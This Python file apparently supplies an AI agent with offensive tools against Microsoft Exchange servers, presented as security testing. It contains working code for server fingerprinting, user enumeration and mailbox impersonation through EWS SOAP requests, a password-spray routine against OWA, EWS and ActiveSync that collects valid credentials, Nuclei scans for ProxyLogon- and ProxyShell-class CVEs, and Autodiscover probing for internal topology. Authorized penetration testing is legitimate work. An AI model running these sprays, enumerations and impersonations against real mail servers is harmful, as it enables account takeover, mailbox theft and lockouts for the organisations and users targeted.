"""Microsoft Exchange security testing tools."""

from __future__ import annotations

import base64
import json
import logging
import shlex
from typing import Any, Literal

from agents import RunContextWrapper, function_tool


logger = logging.getLogger(__name__)

AuthType = Literal["basic", "ntlm", "negotiate"]
SprayEndpoint = Literal["owa", "ews", "activesync"]


# ── helpers ───────────────────────────────────────────────────────────────────


def _ctx_session(ctx: RunContextWrapper) -> Any:
    inner = ctx.context if isinstance(ctx.context, dict) else {}
    return inner.get("sandbox_session")


def _no_session() -> str:
    return json.dumps(
        {"success": False, "error": "Sandbox session not available in run context"},
        ensure_ascii=False,
        default=str,
    )


async def _exec(session: Any, cmd: str, timeout: float = 30.0) -> tuple[str, str, int]:
    result = await session.exec(cmd, timeout=timeout)
    stdout = (
        result.stdout.decode("utf-8", errors="replace")
        if isinstance(result.stdout, bytes)
        else str(result.stdout or "")
    )
    stderr = (
        result.stderr.decode("utf-8", errors="replace")
        if isinstance(result.stderr, bytes)
        else str(result.stderr or "")
    )
    return stdout, stderr, result.exit_code


def _b64(data: str) -> str:
    return base64.b64encode(data.encode("utf-8")).decode()


def _parse_status(stdout: str) -> tuple[str, int | None]:
    """Split '__STATUS:NNN__' marker from stdout, return (body, status_code)."""
    if "__STATUS:" in stdout:
        body, _, rest = stdout.rpartition("__STATUS:")
        try:
            return body.rstrip(), int(rest.replace("__", "").strip())
        except ValueError:
            pass
    return stdout, None


# ── exchange_fingerprint ──────────────────────────────────────────────────────


@function_tool(timeout=120)
async def exchange_fingerprint(
    ctx: RunContextWrapper,
    base_url: str,
    verify_ssl: bool = False,
) -> str:
    """Fingerprint a Microsoft Exchange server — detect version, build, and exposed services.

    Probes all standard Exchange endpoints and extracts version information from
    response headers (X-OWA-Version, X-DiagInfo, X-FEServer, X-BEServer) and
    build number strings in the OWA login page.

    Endpoints probed:
    - /owa/                              Outlook Web Access
    - /ecp/                              Exchange Control Panel (admin)
    - /EWS/Exchange.asmx                 Exchange Web Services SOAP API
    - /autodiscover/autodiscover.xml     Autodiscover service
    - /Microsoft-Server-ActiveSync       Exchange ActiveSync (mobile)
    - /mapi/                             MAPI over HTTP (Outlook)
    - /PowerShell/                       Remote PowerShell / WinRM
    - /ews/odata/                        Exchange REST API (2016+)
    - /rpc/                              RPC over HTTP (legacy)

    Build-to-version mapping (common builds):
    - 15.2.x   Exchange 2019
    - 15.1.x   Exchange 2016
    - 15.0.x   Exchange 2013
    - 14.x     Exchange 2010

    Args:
        base_url: Exchange base URL, e.g. "https://mail.example.com". No trailing slash.
        verify_ssl: Verify TLS certificates (default False — internal servers often use self-signed).
    """
    session = _ctx_session(ctx)
    if session is None:
        return _no_session()

    base = base_url.rstrip("/")
    ssl_flag = "" if verify_ssl else "-k"

    endpoints = [
        "/owa/",
        "/ecp/",
        "/EWS/Exchange.asmx",
        "/autodiscover/autodiscover.xml",
        "/Microsoft-Server-ActiveSync",
        "/mapi/",
        "/PowerShell/",
        "/ews/odata/",
        "/rpc/",
    ]

    _interesting_headers = {
        "x-owa-version", "x-diaginfo", "x-feserver", "x-beserver",
        "x-aspnet-version", "x-powered-by", "www-authenticate", "server",
        "x-ms-diagnostics",
    }

    findings: dict[str, Any] = {}
    for path in endpoints:
        url = shlex.quote(base + path)
        cmd = (
            f"curl -s {ssl_flag} -I -m 10 --connect-timeout 5 -L --max-redirs 2 "
            f"-w '\\n__STATUS:%{{http_code}}__' {url} 2>&1"
        )
        stdout, _, _ = await _exec(session, cmd, timeout=15.0)
        body, status = _parse_status(stdout)
        headers: dict[str, str] = {}
        for line in body.splitlines():
            if ":" in line and not line.startswith("HTTP/"):
                key, _, val = line.partition(":")
                if key.strip().lower() in _interesting_headers:
                    headers[key.strip()] = val.strip()
        findings[path] = {"status": status, "headers": headers}

    # Extract build numbers from OWA login page JS/CSS URL paths
    owa_url = shlex.quote(base + "/owa/auth/logon.aspx")
    ver_cmd = (
        f"curl -s {ssl_flag} -m 15 --connect-timeout 5 {owa_url} 2>&1 "
        f"| grep -oE '[0-9]{{2}}\\.[0-9]+\\.[0-9]+\\.[0-9]+' | sort -u | head -5"
    )
    ver_out, _, _ = await _exec(session, ver_cmd, timeout=20.0)
    build_versions = [v for v in ver_out.strip().splitlines() if v]

    owa_version = next(
        (d["headers"].get("X-OWA-Version", "") for d in findings.values() if d["headers"].get("X-OWA-Version")),
        "",
    )

    return json.dumps(
        {
            "success": True,
            "base_url": base,
            "owa_version_header": owa_version,
            "build_versions_from_page": build_versions,
            "endpoints": findings,
        },
        ensure_ascii=False,
        default=str,
    )


# ── exchange_ews_request ──────────────────────────────────────────────────────


@function_tool(timeout=60, strict_mode=False)
async def exchange_ews_request(
    ctx: RunContextWrapper,
    base_url: str,
    soap_action: str,
    soap_body: str,
    username: str | None = None,
    password: str | None = None,
    auth_type: AuthType = "ntlm",
    impersonate_email: str | None = None,
    verify_ssl: bool = False,
    timeout_seconds: int = 30,
) -> str:
    """Send an authenticated (or unauthenticated) EWS SOAP request to /EWS/Exchange.asmx.

    EWS is Exchange's primary SOAP/XML API. Pass the inner XML element(s) as `soap_body`;
    this tool wraps them in the full SOAP envelope automatically.

    Common soap_action / soap_body combinations:

    **ResolveNames** (user enumeration — often works unauthenticated):
        soap_action="ResolveNames"
        soap_body='<ResolveNames xmlns="...messages" ReturnFullContactData="false">
          <UnresolvedEntry>jdoe</UnresolvedEntry></ResolveNames>'

    **FindFolder** (list mailbox folders):
        soap_action="FindFolder"
        soap_body='<FindFolder Traversal="Shallow" xmlns="...messages">
          <FolderShape><t:BaseShape>AllProperties</t:BaseShape></FolderShape>
          <ParentFolderIds><t:DistinguishedFolderId Id="msgfolderroot"/></ParentFolderIds>
        </FindFolder>'

    **FindItem** (list emails):
        soap_action="FindItem"
        soap_body='<FindItem Traversal="Shallow" xmlns="...messages">
          <ItemShape><t:BaseShape>IdOnly</t:BaseShape></ItemShape>
          <ParentFolderIds><t:DistinguishedFolderId Id="inbox"/></ParentFolderIds>
        </FindItem>'

    **GetUserAvailability** (check if user exists — often unauthenticated):
        soap_action="GetUserAvailability"
        soap_body='<GetUserAvailabilityRequest xmlns="...messages">
          <t:TimeZone><t:Bias>-60</t:Bias><t:StandardTime/><t:DaylightTime/></t:TimeZone>
          <MailboxDataArray><t:MailboxData>
            <t:Email><t:Address>user@domain.com</t:Address></t:Email>
            <t:AttendeeType>Required</t:AttendeeType>
          </t:MailboxData></MailboxDataArray>
          <FreeBusyViewOptions><t:TimeWindow>
            <t:StartTime>2024-01-01T00:00:00</t:StartTime>
            <t:EndTime>2024-01-01T01:00:00</t:EndTime>
          </t:TimeWindow><t:RequestedView>FreeBusy</t:RequestedView></FreeBusyViewOptions>
        </GetUserAvailabilityRequest>'

    Args:
        base_url: Exchange base URL (e.g. "https://mail.example.com").
        soap_action: EWS operation name (e.g. "FindFolder", "ResolveNames", "GetItem").
        soap_body: Inner XML content inside <soap:Body> — do NOT wrap in envelope.
        username: Username for authenticated requests (domain\\user or UPN).
        password: Password (required when username is provided).
        auth_type: "ntlm" (default), "basic", or "negotiate".
        impersonate_email: If set, adds ExchangeImpersonation SOAP header to act as this mailbox.
        verify_ssl: Verify TLS certificates.
        timeout_seconds: HTTP request timeout in seconds.
    """
    session = _ctx_session(ctx)
    if session is None:
        return _no_session()

    base = base_url.rstrip("/")
    ews_url = base + "/EWS/Exchange.asmx"
    ssl_flag = "" if verify_ssl else "-k"

    impersonation_header = ""
    if impersonate_email:
        impersonation_header = f"""  <soap:Header>
    <t:ExchangeImpersonation>
      <t:ConnectingSID>
        <t:PrimarySmtpAddress>{impersonate_email}</t:PrimarySmtpAddress>
      </t:ConnectingSID>
    </t:ExchangeImpersonation>
  </soap:Header>"""

    envelope = (
        '<?xml version="1.0" encoding="utf-8"?>'
        '<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" '
        'xmlns:xsd="http://www.w3.org/2001/XMLSchema" '
        'xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" '
        'xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types">'
        f"{impersonation_header}"
        "<soap:Body>"
        f"{soap_body}"
        "</soap:Body>"
        "</soap:Envelope>"
    )

    soap_action_full = (
        f"http://schemas.microsoft.com/exchange/services/2006/messages/{soap_action}"
    )

    auth_flags = ""
    if username and password:
        creds = shlex.quote(f"{username}:{password}")
        if auth_type == "ntlm":
            auth_flags = f"--ntlm -u {creds}"
        elif auth_type == "negotiate":
            auth_flags = f"--negotiate -u {creds}"
        else:
            auth_flags = f"--basic -u {creds}"

    b64_body = _b64(envelope)
    cmd = (
        f"curl -s {ssl_flag} -m {timeout_seconds} --connect-timeout 10 "
        f"-X POST {auth_flags} "
        f'-H "Content-Type: text/xml; charset=utf-8" '
        f'-H {shlex.quote("SOAPAction: " + soap_action_full)} '
        f"-d \"$(echo {shlex.quote(b64_body)} | base64 -d)\" "
        f"-w '\\n__STATUS:%{{http_code}}__' "
        f"{shlex.quote(ews_url)} 2>&1"
    )

    stdout, stderr, exit_code = await _exec(session, cmd, timeout=float(timeout_seconds + 15))
    body, status = _parse_status(stdout)

    return json.dumps(
        {
            "success": exit_code == 0,
            "status_code": status,
            "response_body": body[:8000],
            "truncated": len(body) > 8000,
            "stderr": stderr if exit_code != 0 else "",
        },
        ensure_ascii=False,
        default=str,
    )


# ── exchange_spray ────────────────────────────────────────────────────────────


@function_tool(timeout=600, strict_mode=False)
async def exchange_spray(
    ctx: RunContextWrapper,
    base_url: str,
    usernames: list[str],
    passwords: list[str],
    endpoint: SprayEndpoint = "owa",
    delay_seconds: float = 2.0,
    verify_ssl: bool = False,
    domain: str | None = None,
) -> str:
    """Password spray against Exchange authentication endpoints with lockout-safe timing.

    Iterates passwords outer / usernames inner (one password across all accounts before
    moving to the next) to minimize per-account lockout risk. Stops spraying a username
    the moment valid credentials are confirmed.

    Supported endpoints:
    - "owa"         Form-based POST to /owa/auth.owa  — success = redirect to inbox
    - "ews"         NTLM to /EWS/Exchange.asmx        — success = HTTP 200 or 400/500 (not 401)
    - "activesync"  Basic auth to /Microsoft-Server-ActiveSync — success = 200 or 501

    ⚠  LOCKOUT RISK: Set delay_seconds to at least the lockout observation window.
    Default lockout policies reset after 30–60 minutes. Always verify the target policy
    before spraying. One password per round is the standard safe approach.

    Args:
        base_url: Exchange base URL (e.g. "https://mail.example.com").
        usernames: Usernames to test (UPN "user@domain.com" or NetBIOS "DOMAIN\\user").
        passwords: Passwords to spray — outer loop; all accounts get one password before next.
        endpoint: "owa" (default), "ews", or "activesync".
        delay_seconds: Pause between each individual attempt (default 2.0 s).
        verify_ssl: Verify TLS certificates.
        domain: NetBIOS domain to prepend to bare usernames (e.g. "CORP").
    """
    session = _ctx_session(ctx)
    if session is None:
        return _no_session()

    base = base_url.rstrip("/")
    ssl_flag = "" if verify_ssl else "-k"
    delay = max(0.0, float(delay_seconds))

    valid_credentials: list[dict[str, str]] = []
    found_users: set[str] = set()
    attempts = 0
    errors: list[str] = []

    for password in passwords:
        for raw_user in usernames:
            username = f"{domain}\\{raw_user}" if domain and "\\" not in raw_user and "@" not in raw_user else raw_user
            if username in found_users:
                continue
            attempts += 1
            try:
                if endpoint == "owa":
                    valid = await _spray_owa(session, base, ssl_flag, username, password, delay)
                elif endpoint == "ews":
                    valid = await _spray_ews(session, base, ssl_flag, username, password, delay)
                else:
                    valid = await _spray_activesync(session, base, ssl_flag, username, password, delay)
            except Exception as exc:  # noqa: BLE001
                errors.append(f"{username}: {exc}")
                continue

            if valid:
                valid_credentials.append({"username": username, "password": password, "endpoint": endpoint})
                found_users.add(username)

    return json.dumps(
        {
            "success": True,
            "attempts": attempts,
            "valid_credentials": valid_credentials,
            "errors": errors[:20],
        },
        ensure_ascii=False,
        default=str,
    )


async def _spray_owa(
    session: Any, base: str, ssl_flag: str, username: str, password: str, delay: float
) -> bool:
    """Return True if OWA form login succeeds."""
    b64_user = _b64(username)
    b64_pass = _b64(password)
    dest = shlex.quote(base + "/owa/")
    owa_url = shlex.quote(base + "/owa/auth.owa")
    # Decode creds into shell variables to avoid quoting headaches
    cmd = (
        f"_u=$(echo {shlex.quote(b64_user)} | base64 -d); "
        f"_p=$(echo {shlex.quote(b64_pass)} | base64 -d); "
        f"curl -s {ssl_flag} -m 20 --connect-timeout 10 -X POST "
        f"--data-urlencode \"destination={base}/owa/\" "
        f"--data-urlencode 'flags=4' "
        f"--data-urlencode 'forcedownlevel=0' "
        f"--data-urlencode \"username=$_u\" "
        f"--data-urlencode \"password=$_p\" "
        f"--data-urlencode 'isUtf8=1' "
        f"-D - -o /dev/null "
        f"-w '\\n__STATUS:%{{http_code}}:__LOC:%{{redirect_url}}__' "
        f"{owa_url} 2>&1; sleep {delay}"
    )
    stdout, _, _ = await _exec(session, cmd, timeout=25.0 + delay)
    if "__STATUS:" not in stdout:
        return False
    rest = stdout.rsplit("__STATUS:", 1)[1]
    try:
        parts = rest.split(":")
        status = int(parts[0])
        loc = rest.split("__LOC:", 1)[1].replace("__", "").strip() if "__LOC:" in rest else ""
        # Success: 302 to /owa/# or inbox — not to logon.aspx?reason=
        return status in (301, 302) and "logon" not in loc.lower() and "reason" not in loc.lower()
    except (ValueError, IndexError):
        return False


async def _spray_ews(
    session: Any, base: str, ssl_flag: str, username: str, password: str, delay: float
) -> bool:
    """Return True if EWS NTLM auth succeeds (200/400/500 = valid creds, 401 = bad)."""
    b64_creds = _b64(f"{username}:{password}")
    ews_url = shlex.quote(base + "/EWS/Exchange.asmx")
    cmd = (
        f"_c=$(echo {shlex.quote(b64_creds)} | base64 -d); "
        f"curl -s {ssl_flag} -m 20 --connect-timeout 10 "
        f"--ntlm -u \"$_c\" "
        f'-H "Content-Type: text/xml" '
        f"-d '<soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"><soap:Body/></soap:Envelope>' "
        f"-w '\\n__STATUS:%{{http_code}}__' -o /dev/null "
        f"{ews_url} 2>&1; sleep {delay}"
    )
    stdout, _, _ = await _exec(session, cmd, timeout=25.0 + delay)
    if "__STATUS:" not in stdout:
        return False
    try:
        status = int(stdout.rsplit("__STATUS:", 1)[1].replace("__", "").strip())
        return status not in (401, 403)
    except ValueError:
        return False


async def _spray_activesync(
    session: Any, base: str, ssl_flag: str, username: str, password: str, delay: float
) -> bool:
    """Return True if ActiveSync Basic auth succeeds (200/501 = valid, 401 = bad)."""
    b64_creds = _b64(f"{username}:{password}")
    eas_url = shlex.quote(base + "/Microsoft-Server-ActiveSync")
    cmd = (
        f"_c=$(echo {shlex.quote(b64_creds)} | base64 -d); "
        f"curl -s {ssl_flag} -m 20 --connect-timeout 10 "
        f"--basic -u \"$_c\" "
        f"-w '\\n__STATUS:%{{http_code}}__' -o /dev/null "
        f"{eas_url} 2>&1; sleep {delay}"
    )
    stdout, _, _ = await _exec(session, cmd, timeout=25.0 + delay)
    if "__STATUS:" not in stdout:
        return False
    try:
        status = int(stdout.rsplit("__STATUS:", 1)[1].replace("__", "").strip())
        return status in (200, 501)  # 501 = valid creds but no device registered
    except ValueError:
        return False


# ── exchange_check_cve ────────────────────────────────────────────────────────


@function_tool(timeout=300)
async def exchange_check_cve(
    ctx: RunContextWrapper,
    base_url: str,
    verify_ssl: bool = False,
    cves: list[str] | None = None,
    timeout_seconds: int = 270,
) -> str:
    """Scan a Microsoft Exchange server for known CVEs using Nuclei templates.

    By default runs all Nuclei templates tagged "exchange". You can also pass a specific
    list of CVE IDs to test only those templates.

    High-impact Exchange CVEs covered by public Nuclei templates:

    | CVE              | Name          | CVSS | Description                                          |
    |------------------|---------------|------|------------------------------------------------------|
    | CVE-2021-26855   | ProxyLogon    | 9.8  | Pre-auth SSRF → auth bypass                         |
    | CVE-2021-27065   | ProxyLogon    | 7.8  | Chained post-auth arbitrary file write               |
    | CVE-2021-26857   | —             | 7.8  | Unified Messaging insecure deserialization           |
    | CVE-2021-34473   | ProxyShell    | 9.8  | ACL bypass via URL normalization                     |
    | CVE-2021-34523   | ProxyShell    | 9.0  | Backend PowerShell privilege escalation              |
    | CVE-2021-31207   | ProxyShell    | 6.6  | Post-auth arbitrary file write (chain with above)    |
    | CVE-2022-41040   | ProxyNotShell | 8.8  | Authenticated SSRF                                   |
    | CVE-2022-41082   | ProxyNotShell | 8.8  | RCE via PowerShell (chain with CVE-2022-41040)       |
    | CVE-2022-41080   | OWASSRF       | 8.8  | ECP privilege escalation (bypasses PN mitigations)   |
    | CVE-2023-21529   | —             | 8.8  | RCE Exchange 2019                                    |
    | CVE-2023-21706   | —             | 8.8  | RCE                                                  |
    | CVE-2023-21707   | —             | 8.8  | RCE                                                  |

    Args:
        base_url: Exchange target URL (e.g. "https://mail.example.com").
        verify_ssl: Verify TLS certificates.
        cves: Specific CVE IDs to test (e.g. ["CVE-2021-26855", "CVE-2021-34473"]).
              If omitted, runs full "exchange" tag scan.
        timeout_seconds: Maximum total scan duration in seconds (default 270).
    """
    session = _ctx_session(ctx)
    if session is None:
        return _no_session()

    ssl_flag = "-no-verify-ssl" if not verify_ssl else ""
    target = shlex.quote(base_url.rstrip("/"))

    if cves:
        template_args = " ".join(
            f"-t {shlex.quote('http/cves/' + cve[:4] + '/' + cve.upper() + '.yaml')}"
            for cve in cves
        )
    else:
        template_args = "-tags exchange"

    cmd = (
        f"nuclei -u {target} {template_args} {ssl_flag} "
        f"-j -silent -duc -no-color -timeout 10 -retries 1 -rl 10 2>&1"
    )

    logger.info("exchange_check_cve: nuclei %s", cmd)
    stdout, _, exit_code = await _exec(session, cmd, timeout=float(timeout_seconds + 20))

    findings: list[dict[str, Any]] = []
    raw_lines: list[str] = []
    for line in stdout.splitlines():
        line = line.strip()
        if not line:
            continue
        raw_lines.append(line)
        try:
            obj = json.loads(line)
            info = obj.get("info", {})
            findings.append(
                {
                    "template_id": obj.get("template-id"),
                    "name": info.get("name"),
                    "severity": info.get("severity"),
                    "cvss_score": info.get("classification", {}).get("cvss-score"),
                    "matched_at": obj.get("matched-at"),
                    "description": (info.get("description") or "")[:400],
                    "cve": (info.get("classification", {}).get("cve-id") or []),
                }
            )
        except (json.JSONDecodeError, AttributeError):
            pass

    return json.dumps(
        {
            "success": True,
            "exit_code": exit_code,
            "findings_count": len(findings),
            "findings": findings,
            "raw_output": raw_lines[-30:] if not findings else [],
        },
        ensure_ascii=False,
        default=str,
    )


# ── exchange_autodiscover ─────────────────────────────────────────────────────


@function_tool(timeout=60)
async def exchange_autodiscover(
    ctx: RunContextWrapper,
    domain: str,
    email: str | None = None,
    base_url: str | None = None,
    verify_ssl: bool = False,
) -> str:
    """Probe Exchange Autodiscover for configuration and internal topology disclosure.

    Autodiscover is a service-discovery protocol that reveals internal server names,
    IP addresses, internal DNS suffixes, Exchange version, and deployment topology.
    In many configurations it responds to unauthenticated POST requests.

    Probes (GET + authenticated POST with email address):
    - https://<domain>/autodiscover/autodiscover.xml
    - https://autodiscover.<domain>/autodiscover/autodiscover.xml
    - http://<domain>/autodiscover/autodiscover.xml
    - base_url/autodiscover/autodiscover.xml (if provided)

    Also performs a DNS SRV lookup for _autodiscover._tcp.<domain> to find
    non-standard Autodiscover servers.

    What to look for in responses:
    - <Server> / <ASUrl> — internal server hostnames or IPs
    - <EwsUrl> — internal EWS URL
    - <OWAUrl> — OWA URL (may reveal internal addressing)
    - <DisplayName> — confirms user/email validity
    - Error 500 with SOAP fault details — leaks internal info

    Args:
        domain: Target domain (e.g. "example.com").
        email: Email for the POST body (e.g. "user@example.com"). Defaults to "test@<domain>".
        base_url: Override — also probe this base URL (e.g. "https://mail.example.com").
        verify_ssl: Verify TLS certificates.
    """
    session = _ctx_session(ctx)
    if session is None:
        return _no_session()

    ssl_flag = "" if verify_ssl else "-k"
    email_addr = email or f"test@{domain}"

    probe_urls: list[str] = []
    if base_url:
        probe_urls.append(base_url.rstrip("/") + "/autodiscover/autodiscover.xml")
    probe_urls += [
        f"https://{domain}/autodiscover/autodiscover.xml",
        f"https://autodiscover.{domain}/autodiscover/autodiscover.xml",
        f"http://{domain}/autodiscover/autodiscover.xml",
    ]

    ad_body = (
        '<?xml version="1.0" encoding="utf-8"?>'
        '<Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006">'
        "<Request>"
        f"<EMailAddress>{email_addr}</EMailAddress>"
        "<AcceptableResponseSchema>"
        "http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a"
        "</AcceptableResponseSchema>"
        "</Request>"
        "</Autodiscover>"
    )
    b64_body = _b64(ad_body)

    probes: list[dict[str, Any]] = []
    for url in probe_urls:
        cmd = (
            f"curl -s {ssl_flag} -m 15 --connect-timeout 5 "
            f"-X POST "
            f'-H "Content-Type: text/xml; charset=utf-8" '
            f"-d \"$(echo {shlex.quote(b64_body)} | base64 -d)\" "
            f"-w '\\n__STATUS:%{{http_code}}__' "
            f"{shlex.quote(url)} 2>&1"
        )
        stdout, _, _ = await _exec(session, cmd, timeout=20.0)
        body, status = _parse_status(stdout)
        probes.append(
            {
                "url": url,
                "status": status,
                "body": body[:4000],
                "truncated": len(body) > 4000,
            }
        )

    srv_cmd = f"dig SRV _autodiscover._tcp.{shlex.quote(domain)} +short 2>&1"
    srv_out, _, _ = await _exec(session, srv_cmd, timeout=10.0)

    return json.dumps(
        {
            "success": True,
            "domain": domain,
            "email_used": email_addr,
            "dns_srv": srv_out.strip(),
            "probes": probes,
        },
        ensure_ascii=False,
        default=str,
    )
